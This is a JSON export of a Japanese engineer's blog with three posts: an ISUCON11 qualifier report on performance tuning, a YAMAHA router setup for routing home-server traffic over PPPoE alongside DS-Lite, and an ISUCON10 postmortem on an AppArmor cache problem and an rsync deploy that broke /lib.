{"pageProps":{"entries":[{"type":"article","slug":"30","body":"NaruseJunチームでISUCON11予選に出ました。\n\n- チームメンバー[^team]\n\t- [@to_hutohu](https://twitter.com/to_hutohu)\n\t- [@takashi_trap](https://twitter.com/takashi_trap)\n\t- [@sekai67](https://twitter.com/sekai67)\n- 結果\n\t- スコア: [919720](https://isucon.net/archives/56021246.html)\n\t- 本戦に行ける！🎉🎉\n\t\t- ココ最近のNaruseJunチームは追試失敗率が高く[^fail]て、2年間本戦に行けていませんでした。悲願達成感があります。\n\n[^team]: 全員が今年出題の[東京工業大学デジタル創作同好会traP](https://trap.jp/)のOBです。\n[^fail]: 運営サイドにも[定評のある](https://twitter.com/sora_h/status/1429334456616189957)失敗率。\n\n## やったこと\n\n- NaruseJunチームは基本的に個々人が勝手に改善を突っ込んていくスタイル\n\t- 担当範囲などはあえて決めておらず、全員アプリを触るしインフラもいじる\n\t- ミドルウェアの設定、アプリコード、デプロイスクリプトが全部入った[リポジトリ](https://github.com/narusejun/isucon11-qualify)を使った\n\t\t- それぞれローカルで作業、ブランチを切ってリモートにプッシュ、サーバ上でプルしてデプロイ、といった動き\n\t\t\t- ローカルではテストしない（環境まわりでハマるのは時間の無駄なので）\n\t\t\t- 3人で別々に動いているので、声掛けでサーバの占有権を取ってベンチを投げ、それで動作確認する感じ\n- 初動だけは担当作業を決めていた\n\t- to_hutohu: マニュアル読み込み\n\t- takashi_trap: リポジトリ、デプロイスクリプト周りの準備\n\t- sekai67: 環境立ち上げ、計測ツール類準備\n\t\t- 細かいツールの導入などはすべてansibleで行う\n\t\t\t- [最初の変更](https://github.com/narusejun/isucon11-qualify/commit/6b74fb20740ca5fa31070d7763437d3867e6f063)をリポジトリに入れてデプロイするまで **17分**\n\t\t\t\t- 最初の動きをよく詰めておいたので、スムーズに改善へ移れた\n- 計測結果を元に改善ポイントを見つけた\n\t- **「推測するな、計測せよ」**\n\t- pprof, [fgprof](https://github.com/felixge/fgprof), [alp](https://github.com/tkuchiki/alp), [pt-query-digest](https://www.percona.com/doc/percona-toolkit/LATEST/pt-query-digest.html), [netdata](https://github.com/netdata/netdata) を見ていた\n\t\t- pprofは基本的にFlame Graphだけ見れば大体わかる\n\t- [pprotein](https://github.com/kaz/pprotein)というツールを作って、使った\n\t\t- pprof, alp, pt-query-digestのデータをサーバから収集し、Webブラウザ上で表示できるようにしたもの\n\t\t\t- 過去の計測結果を見れたり、チーム内で計測結果を見ながら相談できたりするので便利\n\t\t- こういうツールを作るのが最近流行ってそう\n\t\t\t- https://twitter.com/_tsuzu_/status/1429064558203731973\n\t\t\t- https://diary.hatenablog.jp/entry/2021/08/22/175403\n\t\t- pproteinはいまのところオープンソースなので、ご活用ください\n\t\t\t- ただしREADMEは書いてない\n- 以下2点の理由から、15時過ぎから新たな改善を入れるのをほぼストップし、追試対策など安全に通過するための戦略に切り替えた（前年の反省）\n\t- 80万点に到達した15時時点で、次点は10万点代、大多数が10万点未達という状況であったこと\n\t- 特定の状況下（http2のGOAWAYハンドリングミス[^goaway]）でベンチマーカーがエラーになり、場合によってはスコアなしになる可能性が残っていたこと\n\t\t- 競技中、これがこちら側のミスであるか、運営側のミスであるかを判断できなかった[^clar]ため、念の為修正を行う判断に至ったが、結果としては不要だった\n\n[^goaway]: 詳細については[予選結果](https://isucon.net/archives/56021237.html)の「不具合について」を参照。\n[^clar]: 競技中に質問を行い「ベンチマーカーのバグである」との回答を頂いてはいましたが、チーム内での議論の結果、必ずしもそうとは言えないのではないかという結論になりました。\n\n### こぼれ話\n\n- 14:30〜15:10まで、コミットするたびに点数が指数関数的に増加した\n\t- あまりにも上がるし、自分たちの想像以上に上がるので、けっこう驚いていた\n\t\t- 運営さんもかなり驚いたたようで、「ベンチマーカーの実装がバグっている可能性がある」として個別で改善方法を確認されました\n\t\t\t- 結果としてバグではなかったのでハッピーエンド\n\t\t- 点数が上がるたびにバグの疑念が強まり、[ベンチマーカー実装担当](https://twitter.com/ryoha000/status/1429097219391574024)の顔がどんどん曇っていったらしい\n\n![](score.png)\n\n### 具体的な改善内容\n\n- だいたい時系列順\n- 初期スコア: 2000くらい\n\t- 改善後スコアは必ずしも当該の改善のみが寄与しているわけではないので注意\n\n#### `isu_condition` テーブルにインデックスを貼る\n\n- 時間: 10:40\n- スコア: 19000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/4132537145c01a54b86207c9e130d3d94b8dc895\n- 根拠\n\t- pt-query-digest結果から。この時点での合計クエリ時間上位2つがこれだった\n\t```\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by `timestamp` desc limit ?\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by timestamp desc\n\t```\n\n#### `/api/trend` で返すデータを 0.5 秒ごとに作るようにする\n\n- 時間: 11:10\n- スコア: 26000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/1e24895db95c0ce776b8751bcf90a49e37ea17b0\n- 根拠:\n\t- pprofのFlame Graphから。getTrendで発行してるSELECTに時間がかかっている[^pprof]。\n\n[![](fg1.png)](fg1.png)\n\n[^pprof]: 次項のFlame Graphと見比べるとgetTrendがすっかり見えなくなっていることがわかります。\n\n#### `isu_condition` テーブルを水平分割 + ログを出さない\n\n- 時間: 12:20\n- スコア: 42000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/fda74ca7e56b70a58a7a49c773cb892d3dae6765\n\t\t- UUIDを使って振り分け先のサーバを決定して、そのサーバから読み書きする。\n\t\t- トランザクションが邪魔なので、消す。よく読むと、トランザクションなしでも正常に処理できることが分かる。\n- 根拠\n\t- alpから。POST `^/api/condition/.+$`の合計時間が大きい。GETもそこそこ大きい。\n\t- pprofのFlame Graphから。getIsuConditions/postIsuConditionsが重い。\n\n[![](fg1.png)](fg1.png)\n\n#### iconをDBにつっこむのをやめてファイルに書き出す\n\n- 時間: 12:50\n- スコア: 52000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/e3cc31346fb89455a0f0123e9ea08156914e28c4\n\n#### 微調整\n\n- 時間: 13:30\n- スコア: 64000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/68f2d06510e6ad147a623bce64dcc0d2b1ab56ca\n\t\t- あえてtrendを返すのを遅くして、ユーザー数の増加を抑える。\n\t- https://github.com/narusejun/isucon11-qualify/commit/72368dc1582670ccdce6fc2e727bb82da5292b30\n\t\t- DBを3台から2台に減らして、appへよりCPU時間を配分する。\n- 根拠\n\t- netdata等から。appとDBが同居しているサーバでCPU使用率がほぼ100%なのに対して、DBのみが動くサーバではまだ余裕があったため。\n\n#### backendを複数台に\n\n- 時間: 14:00\n- スコア: 72000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/99ec56508bb5fc501133f06cc913e20c98de1ec7\n\t\t- appを3台にして、postIsuConditionのみを複数台で処理させる。\n- 根拠\n\t- netdata等から。appサーバからDBを剥がしてもまだCPU使用率が100%だったため。\n\n#### getIsuConditionsFromDBの高速化\n\n- 時間: 14:30\n- スコア: 107000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/7981a778309e216b3734d817c3458c15f20d5564\n\t\t- Generated Column追加、SQLでLIMITする。\n- 根拠\n\t- pt-query-digestから。以下のクエリが遅い＋Rows_sentが異常に大きい。\n\t  ```\n\t  select * from `isu_condition` where `jia_isu_uuid` = ? and `timestamp` < ? order by `timestamp` desc\n\t  ```\n\t- pprofのFlame Graphから。getIsuConditionsFromDBの圧倒的存在感。。。\n\n[![](fg3.png)](fg3.png)\n\n#### `postIsuCondition` バルクインサート + postIsuCondition全受理\n\n- 時間: 14:40\n- スコア: 158000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/d375e46e3d72547b8a3d67a97f26133981264680\n\t- https://github.com/narusejun/isucon11-qualify/commit/4e2da32e02b079fbe56ed2188dabd5639ef7f2c3\n\n#### nginx調整\n\n- 時間: 14:50\n- スコア: 295000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/9e47a40a1f1af444a07fa93c1cc3a33372904b5a\n\t\t- getIsuGraphを3台処理に変更、nginx-backend間通信のkeepalive化。\n- 根拠\n\t- netdata等から。1台目のappサーバがキツそうだったのと、その割にほか2つがヒマそうだったので。\n\n#### getTrend調整\n\n- 時間: 15:00\n- スコア: 346000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/6cc6d718095b0e1d4ffbc3277e53d8ac4966bf52\n\t\t- 意図的にtrendを返すのを遅くしていたところを少しだけ早くしてユーザー数を増やす。\n\n#### グラフ作成時の取得データ量を減らす\n\n- 時間: 15:00\n- スコア: 631000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/659cb46e1210c56aaabf6f40681bfe705453a686\n\t\t- WHERE句にtimestampの範囲で絞る条件を追加。\n- 根拠\n\t- pt-query-digestから。以下のクエリが遅い＋Rows_sentが異常に大きい。\n\t```\n\tselect * from `isu_condition` where `jia_isu_uuid` = ? order by `timestamp`\n\t```\n\n#### nginx調整\n\n- 時間: 15:10\n- スコア: 836000〜932000くらい\n- コミット\n\t- https://github.com/narusejun/isucon11-qualify/commit/3d9f96bfe12f263a0ea8f3aa759b8e73c2659f0a\n\t\t- nginxとappが同居してる場合はnginx-app間通信をunix domain socket経由に\n\t- https://github.com/narusejun/isucon11-qualify/commit/5f4f37918c900ae106da1b54da66d59399da3a41\n\t\t- nginx-app間のkeepaliveコネクション数調整\n\n#### 微調整\n\n- 時間: 16:00〜17:00\n- スコア: 1010000〜1173984(ベストスコア)\n- パラメータをいろいろ調整してた\n\t- MySQL設定\n\t- nginx設定\n\t- getTrend待ち時間\n\n#### 最終\n\n- 時間: 17:00〜\n- スコア: 988417(最終スコア)\n- http2のGOAWAY問題[^goaway]でベンチマークがまれに失敗する問題の対応\n\t- 安全に追試をパスできるように少し性能を落とした\n\n## おわり\n\n運営の皆さんありがとうございました。\n","title":"ISUCON11予選に参加した","image":null,"tags":["参加記","インフラ","ISUCON"],"date":"2021-08-23T00:00:00.000Z","updated":"2021-08-22T19:00:52.000Z"},{"type":"article","slug":"29","body":"おうちネット、最近は楽天ひかりを契約してます。\n楽天モバイルとセットで申し込むと、ひかりも通信料1年間無料になって激アツです。\n\n[IQ1 Advent Calendar 2020](https://adventar.org/calendars/5197) - 16日目の記事です。\n\n[IQ1 Advent Calendar 2020](https://adventar.org/calendars/5197)\n\n## 自宅サーバ\n\n世はまさに大クラウド時代！\n**自宅サーバ**とかいう文字列を目にすることも、こころなしか少なくなったような気がします。\n\n普通の家庭向けインターネット接続サービスではIPv4アドレスが1つしか割当されないのに対して、宅内にはたくさんの端末がある……ので、NAPTでうまいことさばいているのが普通かと思います。\nこういう環境下で家にサーバを置くには、いわゆるポート開放[^1]、静的NAPTの設定が必要になるわけですね。\n\n[^1]: この言い方は好きじゃないですが、よく使われているのでコレで……\n\n## IPv4 over IPv6での自宅サーバ公開\n\n楽天ひかりはIPv4 over IPv6に対応しています。\nこのやりかたでIPv4ネットワークに接続すると、旧来のPPPoEによる接続と比較してパフォーマンスが良い、とされています。\n\nIPv4 over IPv6の実現する方式にはいくつか種類があって、楽天ひかりはXpass（クロスパス）と呼ばれる方式を利用しているとのこと。なんだかカッコいい名前がついていますが、一般的にはDS-Liteと呼ばれるやつですね。\n\nが、DS-Lite方式のIPv4 over IPv6では、いわゆるポート開放ができません。残念。\nでは自宅サーバは公開できないのか？というとそうでもなくて、依然として旧来のPPPoE接続はできるので、こっちを通るようにすれば良いです。\n\n## DS-LiteとPPPoEの併用\n\n家庭用のルータだとそもそもコレができる機種は限られています。\nここは課金ポイントです。業務用っぽいやつを買いましょう。\n\nボクはYAMAHAのNVR510を買いました。\n具体的な設定手順は省きますが、DS-LiteとPPPoEの両方でIPv4ネットワークに接続できたとしましょう。\n\n![](1.png)\n\n当然ですが、DS-Lite側とPPPoE側で別々のアドレス`X.X.X.X`と`Y.Y.Y.Y`を持っているような状態になっています。\n\n普段の通信は、パフォーマンスが良いとされているDS-Lite側(`tunnel 1`)を通したいです。\nなので、デフォルトゲートウェイはこっち側にします。\n\n```\nip route default gateway tunnel 1\n```\n\nこういう感じになっています。\n\n![](2.png)\n\n## 自宅サーバ宛の通信をPPPoE側で受け入れる\n\n今回はHTTPサーバを公開するということにして、PPPoE側のアドレスに来た`80/tcp`の通信をサーバが受け取れるように、静的NAPT[^2]エントリを追加します。\n\n[^2]: YAMAHA製品ではIPマスカレードという名称\n\n```\nnat descriptor type 1 masquerade\nnat descriptor masquerade static 1 100080 192.168.0.250 tcp www\npp select 1\n  ip pp nat descriptor 1\n```\n\nこれで、外の端末からの通信がサーバに到達できるようになりました。\nTCPだと、まず`SYN`パケットが送られてきますよね。\n\n![](3.png)\n\nで、サーバは`SYN/ACK`で応答するわけです。3-wayハンドシェイクというやつの2番目です。\nクライアント(`Z.Z.Z.Z`)がどこにいるなんて末端のサーバは知りません。なので、とりあえず家庭内のルータに丸投げします。当の家庭内ルータもその上位ルータへ投げるだけです。このとき、**デフォルトゲートウェイをDS-Lite側に設定**しているので、当然この`SYN/ACK`もそっち側に行ってしまいます。\n\n![](4.png)\n\nすると、クライアントからするとおかしな事が起こっているように見えるわけです。`Y.Y.Y.Y`に送った`SYN`の返答がなぜか`X.X.X.X`から帰ってくる……これではTCP接続は確立できません。\n返りの通信もPPPoEを通るようにしないとダメそう。\n\nちなみに、UDPならこの状態でも通信できる可能性があります。\n\n## 返りの通信もPPPoEを通す\n\nポリシーベースルーティング（PBR）[^3]をします。\nある条件に合致するような通信だけ、別の経路に流したりできる機能です。\nこれも業務用クラスのルーターじゃないと使えない場合が多そうです。\n\n[^3]: YAMAHA製品ではフィルタ型ルーティングに相当\n\n今回は、HTTPサーバを公開したいという状況なので、送信元が件の自宅サーバでかつポート番号が`80`のときだけ、PPPoE側(`pp 1`)にルーティングするようにします。\n\n```\nip filter 100080 pass 192.168.0.250 * tcp www *\nip route default gateway pp 1 filter 100080 gateway tunnel 1\n```\n\nこれで、こうなります。`SYN`のdstと`SYN/ACK`のsrcが一致して、クライアントは`ACK`を返してくれることでしょう……晴れて接続確立です。\n\n![](5.png)\n\n## おしまい\n\nおわりです。\nなんかもっといい方法ないのかな。\n\n### おまけ：パケットキャプチャ\n\nサーバ側はこう。`192.168.0.250`が宅内のサーバで、`133.130.113.115`は外にいるクライアント。\n`SYN/ACK`をめちゃ再送している。\nクライアントが再送した`SYN`もいっぱい来てる。\n\n![](server.png)\n\nクライアント側。\n`SYN`を再送してる。サーバが送った`SYN/ACK`はそもそも届いてない。\n途中の誰かが捨ててるのかな……（ここわからん）\n\n![](client.png)\n","title":"DS-Lite/PPPoE併用環境で自宅サーバの通信だけPPPoEを通す","image":null,"tags":["アドベントカレンダー","インフラ","ネットワーク","DS-Lite","PPPoE"],"date":"2020-12-16T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"28","body":"ISUCON10お疲れさまでした。運営の皆さん、ありがとうございました。\n\nボク、[@sekai67](https://twitter.com/sekai67)はNaruseJunチームの一員として出場しました。結果はこう。\n\n- 予選では、本選出場圏内の点数を取って余裕をカマしていましたが、追試をパスできずに予選落ち。\n- 本選では、[本選ライブ](http://isucon.net/archives/55063136.html)の企画で、並行チームとして問題に取り組ませてもらう。\n\t- 競技中最高得点 **52567** を記録するものの、追試をパスできず記録なし。伝統芸能\n\nこれは記念写真です。\n\n![](score.png)\n\nまあ追試で落ちてるんですけどね！\n\n参加記はチームメイトの[@to_hutohu](https://twitter.com/to_hutohu)と[@takashi_trap](https://twitter.com/takashi_trap)が書いてくれると信じて、ボクはちょっとしたこぼれ話を書いていきます。\n\n## やらかしリスト\n\n予選、本選どちらにおいても、思い返すとまあいろいろやらかしたんですが、今回は興味深かった2つを抜粋して掘り下げます。\n\n- 予選時、再起動試験を5回ぐらいして、追試落ちは絶対ない状態まで持っていったのに無事追試落ちした話\n- 本選開始後、初手でサーバの1台を使い物にならなくしてチームメイトを困惑させた話\n\n## 予選の追試で落ちた\n\n### 経緯\n\n予選では、チームメイトの2人がわりとギリギリまでアプリ実装のバグ取りを詰めていたので、ボクが1人で再起動試験や後片付けを担当することになりました。\n去年も再起動後に正しく動作させることができずに予選落ちしていますので、今年こそは！と念入りに何度も行っていました。\n\n5回ほど再起動してもOK、再起動後にもデータも正しく引き継がれている。絶対落ちないだろコレは！！！\nと自信満々で競技を終えたわけですが、結果発表でチーム名が呼ばれることはありませんでした……\n\n夜中、凹みつつも競技で使ったサーバの様子を見に行ってみると……\nDBサーバが落ちてるやんけ！！！！！なんで？？！？！？？！？？！！！\n\n### 理由\n\napparmorのポリシー(mysql-serverパッケージに入ってる`/etc/apparmor.d/usr.sbin.mysqld`)が生きていて、systemdがmariadbの起動を検知できておらず、`systemctl stop`相当の処理がかかったため。\n\nUbuntuで、最初にmysqlが動いている状態から、これをmariadbに置き換えると起動しなくなるという事例があります。\nこちらの記事が詳しいです。\n\n[Ubuntuでmysql-serverをmariadb-serverで置き換えるとsystemd経由でmariadbが起動できない](/posts/24/)\n\n## 疑問1: mariadbに入れ替えたときにto-hutohuが`aa-remove-unknown`でポリシーを消したのでは？\n\n先ほど紹介した記事を書いたのはボクです。ですので、もちろんこの挙動については知っていました。\n上記記事で紹介されている対策法をもちろん講じています。\n\nが、これはそもそも恒久対応ではありませんでした……！\nわかりにくい書き方でゴメンナサイ。\n\n先の記事で言及している、\n\n> /etc/apparmor.d/usr.sbin.mysqldは空のファイルで上書きされますが、AppArmorがすでに読み込んでいるプロファイルは削除されません。\n> また、systemctl reload apparmorしても、OSを再起動しても、一度読み込まれたプロファイルが勝手に削除されることはありません。\n\nここの理解が曖昧、あるいは間違っています。\n\nポリシーがOSを再起動しても消えない原因は、apparmorのポリシーキャッシュのせいで、`/etc/apparmor.d/cache/usr.sbin.mysqld`が存在して、かつ`/etc/apparmor.d/usr.sbin.mysqld`よりタイムスタンプが新しい場合、キャッシュのほうが読み込まれるという挙動をします。\n\n- `/etc/apparmor.d/cache/usr.sbin.mysqld`が作成されるのは、mysql-serverインストール時。\n\t- つまりタイムスタンプは → `Sep 11 11:34`\n- `/etc/apparmor.d/usr.sbin.mysqld`のタイムスタンプは、mariadbパッケージが作成された時。\n\t- つまりタイムスタンプは → `Jul 20 10:50`\n\nですので、`/etc/apparmor.d/usr.sbin.mysqld`が更新されたにも関わらず、キャッシュのほうがずっと読み込まれ続けてしまうのでした……！\n\n正しい対応は、`systemctl reload apparmor`でした。\nこれでキャッシュのflushが走り、正しくmariadbに起動するようになります。\n\n例の記事については、そのうち書き換えておきますね……\n\n### 疑問2: sekaiが再起動試験を行ったときにうまく動作していたのは何故？\n\n再起動後15分以内にのみ試験していたからです。\n\nAppArmorのせいでmariadbに起動に失敗するというのは、厳密に言うと、 **mariadbは起動に成功しているんだけどsystemdがそれを検知できていない** ということ。\nsystemdは一定時間（デフォルトで15分）以内にサービスの起動を確認できないと、ご丁寧にExecStopを走らせてくれるのです……！\n\nsekaiが再起動したのは **11:39:26 UTC** ごろ。\n\n```\n-- Reboot --\nSep 12 11:39:26 s2 systemd[1]: Starting MariaDB 10.1.44 database server...\nSep 12 11:39:32 s2 mysqld[1244]: 2020-09-12 11:39:32 139768179551360 [Note] /usr/sbin/mysqld (mysqld 10.1.44-MariaDB-0ubuntu0.18.04.1) starting as process 1244 ...\nSep 12 11:45:11 s2 systemd[1]: Stopped MariaDB 10.1.44 database server.\n-- Reboot --\n```\n\n11:45:11にStopしてるのは、このあともう一度再起動試験したためです。\n\nこの付近のkern.logは以下。\n\n```\nSep 12 11:39:35 s2 kernel: [   42.180656] audit: type=1400 audit(1599910775.956:18): apparmor=\"DENIED\" operation=\"sendmsg\" info=\"Failed name lookup - disconnected path\" error=-13 profile=\"/usr/sbin/mysqld\" name=\"run/systemd/notify\" pid=1244 comm=\"mysqld\" requested_mask=\"w\" denied_mask=\"w\" fsuid=111 ouid=0\n```\n\nsd-notify失敗してるので、この時点でもAppArmorのポリシーが生きています。\nsystemdはこのときずっとmariadbが上がってくるのを待っている状態です。\nただし、mariadb自体は起動しているので、アプリへのリクエストは通る状態です。\n（sekaiのこの状態でずっと再起動試験をしていたわけです。バカですねえ。）\n\n一方で、運営による再起動が行われたと思われる時刻(14:20:38 UTC つまり 23:20:38 JST)付近のログは以下のとおり。\n\n```\n-- Reboot --\nSep 12 14:20:38 s2 systemd[1]: Starting MariaDB 10.1.44 database server...\nSep 12 14:20:42 s2 mysqld[1100]: 2020-09-12 14:20:42 140238334753920 [Note] /usr/sbin/mysqld (mysqld 10.1.44-MariaDB-0ubuntu0.18.04.1) starting as process 1100 ...\nSep 12 14:35:41 s2 systemd[1]: mariadb.service: Start operation timed out. Terminating.\nSep 12 14:35:43 s2 systemd[1]: mariadb.service: Failed with result 'timeout'.\nSep 12 14:35:43 s2 systemd[1]: Failed to start MariaDB 10.1.44 database server.\n```\n\n15分立ったのでmariadbがshutdownされたと思われます。\n以下は`/var/lib/mysql/error.log`です。\n\n```\n2020-09-12 14:35:41 140238333712128 [Note] /usr/sbin/mysqld: Normal shutdown\n2020-09-12 14:35:41 140238333712128 [Note] Event Scheduler: Purging the queue. 0 events\n2020-09-12 14:35:41 140236692629248 [Note] InnoDB: FTS optimize thread exiting.\n2020-09-12 14:35:41 140238333712128 [Note] InnoDB: Starting shutdown...\n2020-09-12 14:35:41 140238333712128 [Note] InnoDB: Waiting for page_cleaner to finish flushing of buffer pool\n2020-09-12 14:35:43 140238333712128 [Note] InnoDB: Shutdown completed; log sequence number 3710056674\n2020-09-12 14:35:43 140238333712128 [Note] /usr/sbin/mysqld: Shutdown complete\n```\n\n実際にアプリにリクエストが来たのは、15:03:13 UTCでした。\n\n```\nSep 12 14:20:45 s1 isuumo[903]: ⇨ http server started on [::]:1323\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 packets.go:122: closing bad idle connection: unexpected read from socke\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 connection.go:158: driver: bad connection\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 packets.go:122: closing bad idle connection: unexpected read from socke\nSep 12 15:03:13 s1 isuumo[903]: [mysql] 2020/09/12 15:03:13 connection.go:158: driver: bad connection\n```\n\nこのとき、もうmariadbはshutdown済みなので、当然アプリは動かないわけですね……\n\n## 開始後即サーバを破壊\n\n### 経緯\n\n本選始まって直後の話。\n\nNaruseJunチームでは、Makefileをタスクランナー的に使っていて、[ここ](https://github.com/narusejun/isucon10-final/blob/master/Makefile)にデプロイコマンドを書いていました。\nsekaiがアプリにpprofを埋め込んだコードをプッシュし、サーバ上にデプロイしようとして`make deploy`を叩いたところ、なぜか途中で`sh: Command not found`のエラーが出てmakeが終了しました。\n\nアレ？`sh`って存在しないんだっけと思い、今度は`ls -l /usr/bin/sh`を実行してみると、今度は`bash: /usr/bin/ls: No such file or directory`が……\nここで全てを悟ります。これ、シェル組み込みのコマンド以外、全て使えなくなってるな……？\n\n心当たりがないわけではありませんでした。3人共、ある会話が頭をよぎりました……\nあれは予選時のことです――――\n\n> sekai「ミドルウェアの設定ファイルなども、リポジトリに含めてしまって、デプロイ時にrsyncで配置するようにしませんか？」\\\n> takashi「rsyncですか？どうやってやるんですか」\\\n> sekai「コマンド一発でできますよ。[こう](https://github.com/narusejun/isucon10-qualify/blob/master/Makefile#L50)ですね」\n\n```\n$ ls files\netc/       home/      lib/\n$ sudo rsync -r files/ /\n```\n\n> takashi「**これってもともとサーバ上にあるファイルが消えたりしませんか？**」←ここフラグ\\\n> sekai「大丈夫ですよ。ほら、追加したファイルだけ更新されてるでしょ？」\n\n予選では確かに、このコマンドでうまくデプロイできていました。\nですので、本選でも同じように設定ファイル類を配置しようとしていました。\n\nしかしながら、事実、サーバが壊れました。何故でしょう……\nこのときのログはこうでした。\n\n```\n〜〜〜略〜〜〜\nmake[1]: Leaving directory '/home/isucon/isucon10-final/app/webapp/golang'\nsudo rsync -v -r s1/ /\nsending incremental file list\ndeploy.sh\nskipping non-regular file \"etc/mysql/my.cnf\"\netc/envoy/config.yaml\netc/mysql/debian-start\netc/mysql/debian.cnf\netc/mysql/my.cnf.fallback\netc/mysql/mysql.cnf\netc/mysql/conf.d/mysql.cnf\netc/mysql/conf.d/mysqldump.cnf\netc/mysql/mysql.conf.d/mysql.cnf\netc/mysql/mysql.conf.d/mysqld.cnf\netc/systemd/system/envoy.service\netc/systemd/system/xsuportal-api-golang.service\netc/systemd/system/xsuportal-web-golang.service\nhome/isucon/env\nlib/\nlib/systemd/\nlib/systemd/system/\nlib/systemd/system/mysql.servicesent 11,952 bytes  received 375 bytes  24,654.00 bytes/sec\ntotal size is 10,449  speedup is 0.85\nsh s1/deploy.sh\nmake: sh: Command not found\nmake: *** [Makefile:54: start] Error 127\n```\n\nう〜ん、`--delete`オプションも付けてないし、このログを見ても特におかしくないしなあ。\n本選時はそう思っていました。\n\nここを詳しく調査する時間がもったいないので、運営にサーバをリセットしてもらい（ご迷惑おかけしました……）、とりあえず危険なMakefileは使用禁止として競技に戻りました。\n\n### その後\n\n競技は無事(?)終了し、翌日。ちゃんと調査しました。\n\nさて、件のログをよ〜く見ると、なんだかヤバそうなところが見つかりますね！？\n\n正解は`lib/`とだけ書いてある行です。\nこれは、rsyncによって`lib/`というディレクトリ、今回は宛先が`/`なので、要は`/lib`が作成されたという意味です。\nんん？？それはマズくないか？？？？？\n\nマズいです。コマンドがほぼ使えなくなったのは、間違いなく`/lib`にある共有ライブラリなどが消滅したからでしょう。\n\nでも、予選時はちゃんと動いていたんです。じゃあなんで？？？\n\n答えは、Ubuntuのバージョン違いにありました。\n予選では18.04、本選では20.04です。各バージョンでのルートディレクトリがどうなっているかと言うと……\n\n18.04では、こう。\n\n```\n# ls -l /\ntotal 64\ndrwxr-xr-x   2 root root 4096 Sep 21 17:17 bin\ndrwxr-xr-x   2 root root 4096 Apr 24  2018 boot\ndrwxr-xr-x   5 root root  360 Oct  4 07:46 dev\ndrwxr-xr-x   1 root root 4096 Oct  4 07:46 etc\ndrwxr-xr-x   2 root root 4096 Apr 24  2018 home\ndrwxr-xr-x   8 root root 4096 May 23  2017 lib\ndrwxr-xr-x   2 root root 4096 Sep 21 17:16 lib64\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 media\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 mnt\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 opt\ndr-xr-xr-x 174 root root    0 Oct  4 07:46 proc\ndrwx------   2 root root 4096 Sep 21 17:17 root\ndrwxr-xr-x   1 root root 4096 Sep 25 22:33 run\ndrwxr-xr-x   1 root root 4096 Sep 25 22:33 sbin\ndrwxr-xr-x   2 root root 4096 Sep 21 17:14 srv\ndr-xr-xr-x  13 root root    0 Oct  4 07:46 sys\ndrwxrwxrwt   2 root root 4096 Sep 21 17:17 tmp\ndrwxr-xr-x   1 root root 4096 Sep 21 17:14 usr\ndrwxr-xr-x   1 root root 4096 Sep 21 17:17 var\n```\n\n一方で20.04では……？\n\n```\n# ls -l /\ntotal 48\nlrwxrwxrwx   1 root root    7 Sep 25 01:20 bin -> usr/bin\ndrwxr-xr-x   2 root root 4096 Apr 15 11:09 boot\ndrwxr-xr-x   5 root root  360 Oct  4 07:46 dev\ndrwxr-xr-x   1 root root 4096 Oct  4 07:46 etc\ndrwxr-xr-x   2 root root 4096 Apr 15 11:09 home\nlrwxrwxrwx   1 root root    7 Sep 25 01:20 lib -> usr/lib\nlrwxrwxrwx   1 root root    9 Sep 25 01:20 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root    9 Sep 25 01:20 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root   10 Sep 25 01:20 libx32 -> usr/libx32\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 media\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 mnt\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 opt\ndr-xr-xr-x 171 root root    0 Oct  4 07:46 proc\ndrwx------   2 root root 4096 Sep 25 01:23 root\ndrwxr-xr-x   1 root root 4096 Sep 25 22:34 run\nlrwxrwxrwx   1 root root    8 Sep 25 01:20 sbin -> usr/sbin\ndrwxr-xr-x   2 root root 4096 Sep 25 01:20 srv\ndr-xr-xr-x  13 root root    0 Oct  4 07:46 sys\ndrwxrwxrwt   2 root root 4096 Sep 25 01:23 tmp\ndrwxr-xr-x   1 root root 4096 Sep 25 01:20 usr\ndrwxr-xr-x   1 root root 4096 Sep 25 01:23 var\n```\n\nアッ……（完全に理解）\n\nUbuntu 20.04では、`/lib`は通常のディレクトリではなく、`/usr/lib`へのシンボリックリンクでした！\nrsyncでは、デフォルトではシンボリックリンクの先がディレクトリであっても、それを辿ってその先にコピーをしたりしません。\nソース側のディレクトリでそのまま上書きして、もとのリンクは消してしまうんですね……！\n\n### 教訓\n\nこの悲劇を回避するには、rsyncの`--keep-dirlinks`というオプションを使うべきでした。\n以下、`man rsync`より引用です。\n\n> -K, --keep-dirlinks\n>     This option causes the receiving side to treat a symlink to a directory as though it were a real directory, but only if it matches a real directory from the sender. Without this option, the receiver's symlink would be deleted and replaced with a real directory.\n>     For example, suppose you transfer a directory lqfoorq that contains a file lqfilerq, but lqfoorq is a symlink to directory lqbarrq on the receiver. Without --keep-dirlinks, the receiver deletes symlink lqfoorq, recreates it as a directory, and receives the file into the new directory. With --keep-dirlinks, the receiver keeps the symlink and lqfilerq ends up in lqbarrq.\n\nちょうどボクが踏んだ罠について言及されています。\nrsyncは気をつけて使います……\n\n## 